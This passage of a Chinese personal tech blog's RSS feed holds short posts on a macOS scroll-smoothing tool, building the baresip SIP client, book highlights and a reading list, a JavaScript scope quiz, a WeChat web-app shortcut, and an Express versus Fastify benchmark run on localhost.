&lt;li&gt;一个用于在MacOS上平滑你的鼠标滚动效果的小工具, 让你的滚轮爽如触控板。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;特性&#34;&gt;特性&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;疯狂平滑你的鼠标滚动效果&lt;/li&gt;
&lt;li&gt;支持分离触控板/鼠标事件, 单独翻转鼠标滚动方向。&lt;/li&gt;
&lt;li&gt;滚动曲线的自定义调整。&lt;/li&gt;
&lt;li&gt;支持区分应用处理, 黑/白名单系统。&lt;/li&gt;
&lt;li&gt;用于监控滚动事件的图形化呈现窗口。&lt;/li&gt;
&lt;li&gt;基于 Swift4 构建&lt;/li&gt;
&lt;li&gt;免费&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/06/ismran/2022-10-29-20-03-32.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;附件&#34;&gt;附件&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2021/dmg/280451/1623822116414-4ccce626-c13b-4ca2-8a10-2a8507129796.dmg?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2021%2Fdmg%2F280451%2F1623822116414-4ccce626-c13b-4ca2-8a10-2a8507129796.dmg%22%2C%22name%22%3A%22Mos.Versions.3.3.2.dmg%22%2C%22size%22%3A8382156%2C%22type%22%3A%22%22%2C%22ext%22%3A%22dmg%22%2C%22status%22%3A%22done%22%2C%22taskId%22%3A%22ue30d0bab-2102-4a8d-9dfb-35e097e9e49%22%2C%22taskType%22%3A%22upload%22%2C%22id%22%3A%22ubff29e7c%22%2C%22card%22%3A%22file%22%7D&#34;&gt;Mos.Versions.3.3.2.dmg&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>baresip 非常好用的终端SIP UA</title>
      <link>https://wdd.js.org/opensips/tools/baresip/</link>
      <pubDate>Tue, 08 Jun 2021 16:27:36 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/baresip/</guid>
      <description>&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
&lt;p&gt;安装前要先安装依赖&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/baresip/re&#34;&gt;https://github.com/baresip/re&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/baresip/rem&#34;&gt;https://github.com/baresip/rem&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;openssl&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;git&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clone&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;https&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//github.com/baresip/baresip
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cd&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;baresip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;make&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sudo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;make&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;install&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;指令&#34;&gt;指令&lt;/h1&gt;
&lt;p&gt;/about                       About box/accept                      Accept incoming call&lt;!-- raw HTML omitted --&gt;/answermode                  Set answer mode&lt;!-- raw HTML omitted --&gt;/apistate                    User Agent state&lt;!-- raw HTML omitted --&gt;/auloop                      Start audio-loop &lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;/auloop_stop                 Stop audio-loop&lt;!-- raw HTML omitted --&gt;/auplay                      Switch audio player&lt;!-- raw HTML omitted --&gt;/ausrc                       Switch audio source&lt;!-- raw HTML omitted --&gt;/callstat                    Call status&lt;!-- raw HTML omitted --&gt;/conf_reload                 Reload config file&lt;!-- raw HTML omitted --&gt;/config                      Print configuration&lt;!-- raw HTML omitted --&gt;/contact_next                Set next contact&lt;!-- raw HTML omitted --&gt;/contact_prev                Set previous contact&lt;!-- raw HTML omitted --&gt;/contacts                    List contacts&lt;!-- raw HTML omitted --&gt;/dial ..                     Dial&lt;!-- raw HTML omitted --&gt;/dialcontact                 Dial current contact&lt;!-- raw HTML omitted --&gt;/hangup                      Hangup call&lt;!-- raw HTML omitted --&gt;/help                        Help menu&lt;!-- raw HTML omitted --&gt;/insmod                      Load module&lt;!-- raw HTML omitted --&gt;/listcalls                   List active calls&lt;!-- raw HTML omitted --&gt;/loglevel                    Log level toggle&lt;!-- raw HTML omitted --&gt;/main                        Main loop debug&lt;!-- raw HTML omitted --&gt;/memstat                     Memory status&lt;!-- raw HTML omitted --&gt;/message                     Message current contact&lt;!-- raw HTML omitted --&gt;/modules                     Module debug&lt;!-- raw HTML omitted --&gt;/netstat                     Network debug&lt;!-- raw HTML omitted --&gt;/options                     Options&lt;!-- raw HTML omitted --&gt;/play                        Play audio file&lt;!-- raw HTML omitted --&gt;/quit                        Quit&lt;!-- raw HTML omitted --&gt;/reginfo                     Registration info&lt;!-- raw HTML omitted --&gt;/rmmod                       Unload module&lt;!-- raw HTML omitted --&gt;/sipstat                     SIP debug&lt;!-- raw HTML omitted --&gt;/sysinfo                     System info&lt;!-- raw HTML omitted --&gt;/timers                      Timer debug&lt;!-- raw HTML omitted --&gt;/uadel                       Delete User-Agent&lt;!-- raw HTML omitted --&gt;/uafind                      Find User-Agent &lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;/uanew                       Create User-Agent&lt;!-- raw HTML omitted --&gt;/uanext                      Toggle UAs&lt;!-- raw HTML omitted --&gt;/uastat                      UA debug&lt;!-- raw HTML omitted --&gt;/uuid                        Print UUID&lt;!-- raw HTML omitted --&gt;/vidloop                     Start video-loop &lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;/vidloop stop                Stop video-loop&lt;!-- raw HTML omitted --&gt;/vidsrc                      Switch video source&lt;/p&gt;</description>
    </item>
    <item>
      <title>一日看尽长安花——听北大教授畅讲中国古代文学</title>
      <link>https://wdd.js.org/posts/2021/06/rml5uy/</link>
      <pubDate>Sun, 06 Jun 2021 21:30:05 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/06/rml5uy/</guid>
      <description>&lt;p&gt;第一讲　关关雎鸠在河洲　——先秦神话和诗歌&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 129&lt;!-- raw HTML omitted --&gt;女娲炼石补天处，石破天惊逗秋雨”，&lt;!-- raw HTML omitted --&gt;第二讲　百家争鸣写春秋　——先秦散文&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 306&lt;!-- raw HTML omitted --&gt;为川者决之使导，为民者宣之使言。”&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 466&lt;!-- raw HTML omitted --&gt;他就发愤努力，一定要做仓库里的老鼠。&lt;!-- raw HTML omitted --&gt;第三讲　大风起兮云飞扬　——汉朝的赋和散文&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 538&lt;!-- raw HTML omitted --&gt;有两个情况可以免死：一是拿出大量的金钱赎身；第二就是受宫刑。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 539&lt;!-- raw HTML omitted --&gt;叫《报任安书》：&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 557&lt;!-- raw HTML omitted --&gt;事情。《史记》写完之后，司马迁就不知所终了。&lt;!-- raw HTML omitted --&gt;第六讲　独念天地之悠悠　——隋与初唐文学&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 1346&lt;!-- raw HTML omitted --&gt;王勃，他在初唐时代是一个非常有才华的少年，他 27岁就死了。真是“千古文章未尽才”。他写《滕王阁序》，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 1359&lt;!-- raw HTML omitted --&gt;就是把你的遭遇拉到跟他相同的地步。譬如说，你考试得了 65分，不高兴，我就对你说：不要难过嘛，我不过只考 67分而已，咱们俩都差不多。&lt;!-- raw HTML omitted --&gt;第七讲　登高壮观天地间　——盛唐诗歌&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 1406&lt;!-- raw HTML omitted --&gt;秦时明月汉时关，万里长征人未还。但使龙城飞将在，不教胡马度阴山。——王昌龄《出塞二首》（其一）&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 1664&lt;!-- raw HTML omitted --&gt;桃花潭水深千尺，不及汪伦送我情。&lt;!-- raw HTML omitted --&gt;第八讲　乌衣巷口夕阳斜　——中唐诗歌&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 1809&lt;!-- raw HTML omitted --&gt;座中泣下谁最多，江州司马青衫湿。”&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 1892&lt;!-- raw HTML omitted --&gt;十年磨一剑，霜刃未曾试。&lt;!-- raw HTML omitted --&gt;第九讲　霜叶红于二月花　——晚唐诗歌&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 1906&lt;!-- raw HTML omitted --&gt;停车坐爱枫林晚，霜叶红于二月花。&lt;!-- raw HTML omitted --&gt;第十讲　大江东去浪淘沙　——两宋金元文学&lt;!-- raw HTML omitted --&gt;书签 - 位置 2168&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 2509&lt;!-- raw HTML omitted --&gt;山盟虽在，锦书难托。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 2559&lt;!-- raw HTML omitted --&gt;劝君更尽一杯酒，西出阳关无故人”，&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 2560&lt;!-- raw HTML omitted --&gt;桃花潭水深千尺，不及汪伦送我情”，&lt;/p&gt;</description>
    </item>
    <item>
      <title>6月书单</title>
      <link>https://wdd.js.org/posts/2021/06/qpdnp4/</link>
      <pubDate>Wed, 02 Jun 2021 21:05:35 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/06/qpdnp4/</guid>
      <description>&lt;h1 id=&#34;5月书单回顾&#34;&gt;5月书单回顾&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《鲁滨逊漂流》记 读完 人在孤独的时候，适合读这本书&lt;/li&gt;
&lt;li&gt;《被讨厌的勇气》读到 69%， 很有幸读到这本书，6月继续&lt;/li&gt;
&lt;li&gt;《围城》读到21%，我好喜欢钱老的比喻句，总是那么别具一格，让人耳目一新&lt;/li&gt;
&lt;li&gt;《一日看尽长安花》读到81%， 我喜欢唐诗宋词，就像是喜欢牛奶一样，非常有营养，又让人回味无穷&lt;/li&gt;
&lt;li&gt;《牛津通识读本 数学》读完，如果我能早点读到这本书，我就很可能喜欢上数学。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;6月书单&#34;&gt;6月书单&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;《鳗鱼的旅行》刚读到20%&lt;/li&gt;
&lt;li&gt;《Googler软件测试之道》刚读到53%， 牛逼的公司，牛逼的测试&lt;/li&gt;
&lt;li&gt;《软件测试之道微软技术专家经验总结》10%&lt;/li&gt;
&lt;li&gt;《沉默的病人》1%&lt;/li&gt;
&lt;li&gt;《一个人的朝圣》0%&lt;/li&gt;
&lt;li&gt;《读懂发票》12%&lt;/li&gt;
&lt;li&gt;《108个训练让你成为手机摄影达人》&lt;/li&gt;
&lt;li&gt;《经济学通识课》&lt;/li&gt;
&lt;li&gt;《楚留香传奇》21%&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Js 101 Question</title>
      <link>https://wdd.js.org/fe/js-101-question/</link>
      <pubDate>Wed, 02 Jun 2021 13:44:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/js-101-question/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test1&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wdd&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test2&lt;/span&gt; () {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test1&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test3&lt;/span&gt; () {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test2&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test3&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>1分钟将微信网页版转为桌面应用</title>
      <link>https://wdd.js.org/posts/2021/06/sxwh8v/</link>
      <pubDate>Tue, 01 Jun 2021 13:07:46 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/06/sxwh8v/</guid>
      <description>&lt;p&gt;在manjaro上我用的wine版本的微信，然而保存文件时，文件无法保存到manjaro中，而只能保存到wine里面的windows中。&lt;/p&gt;
&lt;p&gt;用wine还是很麻烦的，于是我就选择了网页版本的微信。&lt;/p&gt;
&lt;h1 id=&#34;前提&#34;&gt;前提&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;chrome浏览器&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;操作步骤&#34;&gt;操作步骤:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;将微信网页版保存为书签&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;打开谷歌浏览器的 chrome://apps/ 这个页面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后将微信网页版本的的书签拖动到这个页面， 拖动结束后，如下图所示&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在微信的图标上右键，勾选在窗口打开&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后点击创建快捷方式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;点击创建快捷方式后，会弹出弹窗，显示chrome会在桌面和应用菜单中创建快捷方式，选择创建&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后你就可以在桌面上看到微信的图标，点击之后chrome会单独创建一个窗口，作为微信的主界面&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用微信网页版本的好处是&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;很方便的访问Linux上的文件&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;微信通知也正常了&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Perf Test Express Fastify</title>
      <link>https://wdd.js.org/fe/perf-test-express-fastify/</link>
      <pubDate>Mon, 31 May 2021 13:28:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/perf-test-express-fastify/</guid>
      <description>&lt;p&gt;机器信息：4C32G
测试工具：wrk
Node: v14.17.0&lt;/p&gt;
&lt;p&gt;express.js&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;use strict&amp;#39;&lt;/span&gt;                                                                                                                                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;const express &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;const app &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; express&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app.get&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;req, res&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  res.json&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt; hello: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;world&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app.listen&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;fastify.js&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;use strict&amp;#39;&lt;/span&gt;                                                                                                                                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;const fastify &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fastify&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fastify.get&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;req, reply&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  reply.send&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt; hello: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;world&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fastify.listen&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;~
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;测试结果&#34;&gt;测试结果&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# express.js&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Running 10s test @ http://127.0.0.1:3000                                                       
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; threads and &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; connections                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Thread Stats   Avg      Stdev     Max   +/- Stdev                                            
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Latency    55.36ms   11.53ms 173.22ms   93.16%                                             
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Req/Sec   602.58    113.03   830.00     84.97%                                             
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;72034&lt;/span&gt; requests in 10.10s, 17.31MB read                                                       
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Requests/sec:   7134.75                                                                                                                                                                       
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Transfer/sec:      1.71MB  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# fastify.js&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Running 10s test @ http://127.0.0.1:3000                                                       
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; threads and &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; connections                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  Thread Stats   Avg      Stdev     Max   +/- Stdev                                            
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Latency    16.26ms    5.73ms 105.76ms   96.26%                                             
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Req/Sec     2.08k   490.82    14.63k    94.92%                                             
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;249114&lt;/span&gt; requests in 10.09s, 44.43MB read                                                      
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Requests/sec:  24688.94                                                                        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Transfer/sec:      4.40MB  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;fastify是express的3.4倍， 所以对性能有所追求的话，最好用fastify。&lt;/p&gt;</description>
    </item>
    <item>
      <title>5个接口压力测试工具</title>
      <link>https://wdd.js.org/posts/2021/05/fxv15g/</link>
      <pubDate>Mon, 31 May 2021 13:00:16 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/fxv15g/</guid>
      <description>&lt;h1 id=&#34;ab&#34;&gt;ab&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;C语言&lt;/li&gt;
&lt;li&gt;优点
&lt;ul&gt;
&lt;li&gt;安装简单&lt;/li&gt;
